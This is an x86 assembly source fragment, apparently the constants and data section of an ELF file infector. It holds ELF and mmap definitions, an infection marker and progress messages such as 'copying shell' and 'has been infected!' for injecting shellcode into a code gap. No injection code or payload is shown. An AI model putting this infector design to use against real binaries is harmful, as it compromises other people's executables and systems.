;open flag value
%define O_RDONLY 0
%define O_RDWR 2

;mmap flags
%define MAP_SHARED	1
%define MAP_PRIVATE	2

;mmap prots
%define PROT_READ_WRITE 3 ; PROT_READ(1) | PROT_WRITE(2)

;mark offset
%define EI_PAD	9

;e_ident value
%define ELFCLASS32 1 ; 32 bit elf
%define ELFCLASS64 2 ; 64 bit elf

;EI_DATA values (endianess)
%define LITTLE	1

;size of e_ident array
%define ident_size 16

;segment header types
%define PT_LOAD 1

;segment header flags
%define PF_X 1

; errno values
%define SUCCESS		0
%define	ERR_BAD_USAGE	1
%define	ERR_BAD_OPEN	2
%define ERR_BAD_FSTAT	3
%define ERR_EMPTY_FILE	4
%define ERR_BAD_MMAP	5
%define ERR_NOT_TARGET	6
%define ERR_INFECTED	7
%define ERR_NO_SHELL	8
%define ERR_NO_MARKER	9
%define ERR_NO_XL_SEG	10
%define ERR_NO_GAP	11

section .data
	; my special touch
	mark db "||-//", 0x00
	mark_len equ $ - mark

	; usage
	usage db "usage : ./file pivot paylod", 0x0a, 0x00
	usage_len equ $ - usage

	;is opened ?
	bad_open db "couldn't open file!", 0x0a, 0x00
	bad_open_len equ $ - bad_open

	; is an elf file ?
	bad_elf db "file is not an elf :(", 0x0a, 0x00
	bad_elf_len equ $ - bad_elf

	; is stated ?
	bad_stat db "coudn't stat file!", 0x0a, 0x00
	bad_stat_len equ $ - bad_stat

	; is empty file ?
	empty_file db "file appears to be empty!", 0x0a, 0x00
	empty_file_len equ $ - empty_file

	; is mapped correctly ?
	bad_mmap db "couldn't map file!", 0x0a, 0x00
	bad_mmap_len equ $ - bad_mmap

	; is 32 bit elf ?
	bad_32_bit_elf db "one of the files is not a 32 bit elf!", 0x0a, 0x00
	bad_32_bit_elf_len equ $ - bad_32_bit_elf

	; is 64 bit elf ?
	bad_64_bit_elf db "file is not a 64 bit elf!", 0x0a, 0x00
	bad_64_bit_elf_len equ $ - bad_64_bit_elf

	; is little endian ?
	bad_l_endian db "one of the elf files is not little endian!", 0x0a, 0x00
	bad_l_endian_len equ $ - bad_l_endian

	; is already infected ?
	infected db " is already infected :-)", 0x0a, 0x00
	infected_len equ $ - infected

	; target section
	target_section db ".text", 0x00

	; is the binary stripped ?
	no_text db ".text section wasn't found, be sure to supply a non-stripped binary!", 0x0a, 0x00
	no_text_len equ $ - no_text

	; was the marker found ?
	no_marker db "no mark was found, make sure you follow the expectations at the Readme file!", 0x0a, 0x00
	no_marker_len equ $ - no_marker

	; was any gap found ?
	no_gap_found db "no gap was found :(", 0x0a, 0x00
	no_gap_found_len equ $ - no_gap_found

	gap_found db "[+] found a good gap", 0x0a, 0x00
	gap_found_len equ $ - gap_found

	; copying progress
	shell_copied db "[+] copying shell", 0x0a, 0x00
	shell_copied_len equ $ - shell_copied

	; progress string
	marking db "[+] leaving mark ...", 0x0a, 0x00
	marking_len equ $ - marking

	; all good
	enjoy db " has been infected!", 0x0a, 0x00
	enjoy_len equ $ - enjoy
